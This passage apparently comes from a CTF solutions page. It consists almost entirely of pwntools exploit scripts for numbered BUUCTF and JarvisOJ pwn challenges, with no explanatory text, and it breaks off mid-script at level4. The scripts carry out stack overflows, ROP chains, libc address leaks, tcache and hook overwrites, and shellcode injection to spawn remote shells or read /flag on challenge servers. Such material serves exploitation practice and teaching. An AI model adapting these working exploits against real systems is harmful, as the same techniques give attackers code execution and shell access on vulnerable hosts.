<h2 id="0x75-SWPUCTF-2019-p1KkHeap">0x75 SWPUCTF_2019_p1KkHeap</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;pwn&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def add(size):</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,&quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(size))</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,&quot;3&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">    sh.sendafter(&quot;:&quot;,content)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,&quot;4&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,&quot;2&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">def backdoor(content):</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,&quot;666&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;(y or n)&quot;,&quot;y&quot;)</span><br><span class="line">    sh.sendafter(&quot;start&quot;,content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">        lib &#x3D; ELF(&quot;libc.so.6&quot;)</span><br><span class="line">    add(0x90)</span><br><span class="line">    free(0)</span><br><span class="line">    free(0)</span><br><span class="line">    show(0)</span><br><span class="line">    sh.recvuntil(&quot;content: &quot;)</span><br><span class="line">    heap_base &#x3D; u64(sh.recvuntil(&quot;\n&quot;,True).ljust(8,&quot;\x00&quot;)) - 0x260</span><br><span class="line">    add(0x90)</span><br><span class="line">    edit(1,p64(heap_base + 0x10))</span><br><span class="line">    add(0x90)</span><br><span class="line">    add(0x90)</span><br><span class="line">    payload &#x3D; p64(0) + p64(0xffffffffffffffff) * 7 + p64(0) + p64(0x201) + p64(0) * 6 + p64(heap_base + 0x60)</span><br><span class="line">    edit(3,payload)</span><br><span class="line">    add(0x90)</span><br><span class="line">    free(4)</span><br><span class="line">    show(4)</span><br><span class="line">    sh.recvuntil(&quot;content: &quot;)</span><br><span class="line">    libc &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;,False).ljust(8,&#39;\x00&#39;)) - 96 - 0x10 - lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">    __malloc_hook &#x3D; libc + lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">    payload &#x3D; p64(0) + p64(0xffffffffffffffff) * 7 + p64(0) + p64(0x201) + p64(0) * 6 + p64(0x66660000) + p64(__malloc_hook)</span><br><span class="line">    edit(3,payload)</span><br><span class="line">    add(0x90)</span><br><span class="line">    payload &#x3D; shellcraft.open(&quot;&#x2F;flag&quot;)</span><br><span class="line">    payload +&#x3D; shellcraft.read(3,0x66660100,0x30)</span><br><span class="line">    payload +&#x3D; shellcraft.write(1,0x66660100,0x30)</span><br><span class="line">    edit(5,asm(payload))</span><br><span class="line">    add(0xa0)</span><br><span class="line">    edit(6,p64(0x66660000))</span><br><span class="line">    add(0x90)</span><br><span class="line">    log.success(&quot;heap_base: &quot; + hex(heap_base))</span><br><span class="line">    log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        log.success(&quot;pid: &quot; + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pwn(&quot;node3.buuoj.cn&quot;,26426,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x76-axb-2019-final-blindHeap">0x76 axb_2019_final_blindHeap</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">lib &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,26738)</span><br><span class="line">def add(des_size,des,name_size,name):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice:&quot;,&quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;please tell me the desrcription&#39;s size&quot;,str(name_size))</span><br><span class="line">    sh.sendlineafter(&quot;please tell me the desrcript of commodity.&quot;,str(name))</span><br><span class="line">    sh.sendlineafter(&quot;please tell me the commodity-name&#39;s size.&quot;,str(des_size))</span><br><span class="line">    sh.sendlineafter(&quot;please tell me the commodity-name.&quot;,str(des))</span><br><span class="line">def inputName(content):</span><br><span class="line">    sh.sendlineafter(&quot;your name?&quot;,content)</span><br><span class="line">def modifyName(content):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice:&quot;,&quot;6&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;Change your name(1~32):&quot;,content)</span><br><span class="line">def free():</span><br><span class="line">    sh.sendlineafter(&quot;Your choice:&quot;,&quot;4&quot;)</span><br><span class="line">def edit(idx,name,des):</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;index is&quot;,str(idx))</span><br><span class="line">    sh.sendlineafter(&quot;name&quot;,name)</span><br><span class="line">    sh.sendlineafter(&quot;desrc&quot;,des)</span><br><span class="line">def empty(idx):</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;,&quot;5&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;just one&quot;,&quot;2&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;index is&quot;,str(idx))</span><br><span class="line">def showall():</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;all&quot;,&quot;1&quot;)</span><br><span class="line">inputName(&quot;b&quot; *32)</span><br><span class="line">add(0x80,&#39;\x11&#39;, 0x80,&#39;\x12&#39; * 0x80)</span><br><span class="line">sh.sendlineafter(&quot;Your choice:&quot;,&quot;6&quot;)</span><br><span class="line">sh.recvuntil(&quot;b&quot; * 32)</span><br><span class="line">heap_base &#x3D; (u64(sh.recvuntil(&quot;\x2e\n&quot;,True).ljust(8,&#39;\x00&#39;)) &gt;&gt; 12) &lt;&lt; 12</span><br><span class="line">log.success(&quot;heap_base: &quot; + hex(heap_base))</span><br><span class="line">sh.sendline(&quot;a&quot; * 31)</span><br><span class="line">free()</span><br><span class="line">payload &#x3D; &#39;a&#39; * 96</span><br><span class="line">payload +&#x3D; p64(0x600)</span><br><span class="line">payload +&#x3D; p64(heap_base + 0x130 + 0x100 - 0x18 + 0x8 + 0x8)</span><br><span class="line">payload +&#x3D; p64(0x800)</span><br><span class="line">payload +&#x3D; p64(heap_base + 0x10)</span><br><span class="line">add(0x80,&#39;\x13&#39;, 0x80,payload)</span><br><span class="line">add(0x80,&#39;\x14&#39;, 0x80,&#39;\x15&#39; * 0x80)</span><br><span class="line">add(0x80,&#39;\x16&#39;, 0x80,&#39;\x17&#39; * 0x80)</span><br><span class="line">modifyName(&#39;a&#39; * 32)</span><br><span class="line">empty(1)</span><br><span class="line">showall()</span><br><span class="line">main_arena &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">__malloc_hook &#x3D;main_arena - 88 - 0x10</span><br><span class="line">libc &#x3D; __malloc_hook - lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">__free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">log.success(&quot;main_arena: &quot; + hex(main_arena))</span><br><span class="line">log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))</span><br><span class="line">log.success(&quot;__free_hook: &quot;)</span><br><span class="line">payload &#x3D; &#39;a&#39; * 280 + p64(0x666) + p64(__free_hook) + p64(0x100) + p64(heap_base + 0x10)</span><br><span class="line">edit(0,payload,&#39;b&#39;)</span><br><span class="line">edit(1,p64(system),&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">empty(0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x77-axb-2019-brop64">0x77 axb_2019_brop64</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;axb_2019_brop64&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;axb_2019_brop64&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	pop_rdi_ret &#x3D; elf.search(asm(&quot;pop rdi\nret&quot;)).next()</span><br><span class="line">	pop_rsi_r15_ret &#x3D; elf.search(asm(&quot;pop rsi\npop r15\nret&quot;)).next()</span><br><span class="line">	offset &#x3D; 216</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">	payload +&#x3D; p64(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">	payload +&#x3D; p64(elf.plt[&#39;puts&#39;])</span><br><span class="line">	payload +&#x3D; p64(0x4007D6)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	__libc_start_main &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc +lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">	payload +&#x3D; p64(binsh)</span><br><span class="line">	payload +&#x3D; p64(system)</span><br><span class="line">	payload +&#x3D; p64(0xdeadbeef)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,29654,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x78-jarvisoj-tell-me-something">0x78 jarvisoj_tell_me_something</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh &#x3D; process(&quot;.&#x2F;guestbook&quot;)</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,25564)</span><br><span class="line">junk &#x3D; &#39;a&#39; * 0x88</span><br><span class="line">shell_address &#x3D; 0x0000000000400620</span><br><span class="line">payload &#x3D; junk + p64(shell_address)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(&quot;message:\n&quot;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x79-jarvisoj-level3-x64">0x79 jarvisoj_level3_x64</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">sh&#x3D;remote(&quot;node3.buuoj.cn&quot;,25389)</span><br><span class="line">#sh &#x3D; process (&#39;.&#x2F;level3_x64&#39;)</span><br><span class="line">elf &#x3D; ELF(&quot;level3_x64&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;libc-2.23 .so&quot;)</span><br><span class="line">write_addr &#x3D; elf.symbols[&#39;write&#39;]</span><br><span class="line">read_addr &#x3D; elf.symbols[&#39;read&#39;]</span><br><span class="line">start_addr &#x3D; elf.symbols[&#39;_start&#39;]</span><br><span class="line">__libc_start_main_addr &#x3D; elf.got[&#39;__libc_start_main&#39;]</span><br><span class="line">bss_addr &#x3D; elf.bss()</span><br><span class="line">pop_rdi_ret &#x3D; 0x00000000004006b3</span><br><span class="line">pop_rsi_r15_ret &#x3D; 0x00000000004006b1</span><br><span class="line">payload &#x3D;  &#39;a&#39; * 136</span><br><span class="line">payload +&#x3D;   p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret)  + p64(__libc_start_main_addr) + p64(1)  + p64(write_addr)</span><br><span class="line">payload +&#x3D; p64(0x00000000004005E6)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">__libc_start_main &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;)) </span><br><span class="line">libc_base &#x3D; __libc_start_main - libc.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">ret_text &#x3D; u64(sh.recv(8))</span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">shell_addr &#x3D; libc_base + next(libc.search(&#39;&#x2F;bin&#x2F;sh\0&#39;))</span><br><span class="line">payload &#x3D; &#39;a&#39;*136 + p64(pop_rdi_ret) + p64(shell_addr) + p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x80-jarvisoj-level0">0x80 jarvisoj_level0</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh &#x3D; process(&quot;.&#x2F;level0&quot;)</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,29420)</span><br><span class="line">offset &#x3D; 136</span><br><span class="line">payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">payload +&#x3D; p64(0x0000000000400596)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x81-jarvisoj-level1">0x81 jarvisoj_level1</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;level1&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;level1&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	pop_ebx_ret &#x3D; elf.search(asm(&quot;pop ebx\nret&quot;)).next()</span><br><span class="line">	pop3_ret &#x3D; elf.search(asm(&quot;pop esi\npop edi\npop ebp\nret&quot;)).next()</span><br><span class="line">	offset &#x3D; 140</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(elf.plt[&#39;read&#39;])</span><br><span class="line">	payload +&#x3D; p32(pop3_ret)</span><br><span class="line">	payload +&#x3D; p32(0)</span><br><span class="line">	payload +&#x3D; p32(elf.bss())</span><br><span class="line">	payload +&#x3D; p32(0x300)</span><br><span class="line">	payload +&#x3D; p32(elf.bss())</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,27154,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x82-jarvisoj-level2">0x82 jarvisoj_level2</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">#sh &#x3D; process(&quot;.&#x2F;level2&quot;)</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,26267)</span><br><span class="line">elf &#x3D; ELF(&quot;level2&quot;)</span><br><span class="line">offset &#x3D; 140</span><br><span class="line">pop3_ret &#x3D; 0x08048519</span><br><span class="line">payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">payload +&#x3D; p32(elf.plt[&#39;read&#39;])</span><br><span class="line">payload +&#x3D; p32(pop3_ret)</span><br><span class="line">payload +&#x3D; p32(0) + p32(elf.bss()) + p32(0x100)</span><br><span class="line">payload +&#x3D; p32(elf.plt[&#39;system&#39;])</span><br><span class="line">payload +&#x3D; p32(0xdeadbeef)</span><br><span class="line">payload +&#x3D; p32(elf.bss())</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.send(&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x83-jarvisoj-level2-x64">0x83 jarvisoj_level2(x64)</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">#sh &#x3D; process(&quot;level2_x64&quot;)</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,27781)</span><br><span class="line">elf &#x3D; ELF(&quot;level2_x64&quot;)</span><br><span class="line">offset &#x3D; 0x88</span><br><span class="line">payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">payload +&#x3D; p64(0x4006b3)#pop rdi   ret</span><br><span class="line">payload +&#x3D; p64(elf.search(&#39;&#x2F;bin&#x2F;sh\x00&#39;).next())</span><br><span class="line">payload +&#x3D; p64(elf.plt[&#39;system&#39;])</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x84-jarvisoj-leve3">0x84 jarvisoj_leve3</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">lib &#x3D; ELF(&quot;libc-2.23_x32.so&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;level3&quot;)</span><br><span class="line">#sh &#x3D; process(&quot;.&#x2F;level3&quot;)</span><br><span class="line">sh &#x3D; remote(&quot;node3.buuoj.cn&quot;,28412)</span><br><span class="line">#libc leak</span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x88 + 4)</span><br><span class="line">payload +&#x3D; p32(elf.plt[&#39;write&#39;])</span><br><span class="line">payload +&#x3D; p32(0x08048519)</span><br><span class="line">payload +&#x3D; p32(1)</span><br><span class="line">payload +&#x3D; p32(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">payload +&#x3D; p32(4)</span><br><span class="line">payload +&#x3D; p32(elf.symbols[&#39;main&#39;])#control EIP</span><br><span class="line">sh.send(payload)</span><br><span class="line">__libc_start_main &#x3D; u32(sh.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x88 + 4)</span><br><span class="line">payload +&#x3D; p32(system)</span><br><span class="line">payload +&#x3D; p32(0xdeadbeef)</span><br><span class="line">payload +&#x3D; p32(binsh)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x85-jarvisoj-level4">0x85 jarvisoj_level4</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;level4&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh 